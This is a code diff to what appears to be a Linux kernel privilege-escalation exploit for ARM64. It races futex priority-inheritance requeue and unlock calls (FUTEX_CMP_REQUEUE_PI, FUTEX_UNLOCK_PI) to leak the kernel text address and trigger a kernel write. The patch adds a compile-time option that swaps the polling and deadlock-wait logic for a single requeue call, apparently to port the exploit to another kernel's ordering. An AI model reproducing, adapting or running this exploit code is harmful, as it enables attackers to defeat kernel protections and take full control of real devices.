@@ -22,6 +22,9 @@
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
+#ifndef SLIDE_UPSTREAM_PI_REQUEUE_ORDER
+#define SLIDE_UPSTREAM_PI_REQUEUE_ORDER 0
+#endif
 
 #if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
     (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
@@ -37,7 +40,9 @@ static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
 static atomic_int slide_owner_acquired;
+#if !SLIDE_UPSTREAM_PI_REQUEUE_ORDER
 static atomic_int slide_deadlock_seen;
+#endif
 static atomic_int slide_waiter_ok;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
@@ -746,17 +751,21 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   atomic_store(&slide_waiter_ok, 1);
+#if !SLIDE_UPSTREAM_PI_REQUEUE_ORDER
   while (!atomic_load(&slide_deadlock_seen)) {
     __asm__ volatile("yield" ::: "memory");
   }
+#endif
   if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter unlock chain errno=%d\n", errno);
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
+#if !SLIDE_UPSTREAM_PI_REQUEUE_ORDER
   while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
+#endif
 
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
@@ -873,6 +882,13 @@ uint64_t slide_child_leak_stext(void) {
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
+#if SLIDE_UPSTREAM_PI_REQUEUE_ORDER
+  requeue_polls = 1;
+  errno = 0;
+  requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                         &slide_f_pi_target, 0);
+  requeue_errno = errno;
+#else
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
@@ -886,12 +902,15 @@ uint64_t slide_child_leak_stext(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
+#endif
   pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
           requeue_ret, requeue_errno, requeue_polls);
+#if !SLIDE_UPSTREAM_PI_REQUEUE_ORDER
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
     return 0;
   }
   atomic_store(&slide_deadlock_seen, 1);
+#endif
 
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
@@ -921,6 +940,13 @@ static int slide_child_trigger_write(void) {
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
+#if SLIDE_UPSTREAM_PI_REQUEUE_ORDER
+  requeue_polls = 1;
+  errno = 0;
+  requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                         &slide_f_pi_target, 0);
+  requeue_errno = errno;
+#else
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
@@ -934,10 +960,15 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
+#endif
+  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
+          requeue_ret, requeue_errno, requeue_polls);
+#if !SLIDE_UPSTREAM_PI_REQUEUE_ORDER
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
     return 0;
   }
   atomic_store(&slide_deadlock_seen, 1);
+#endif
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
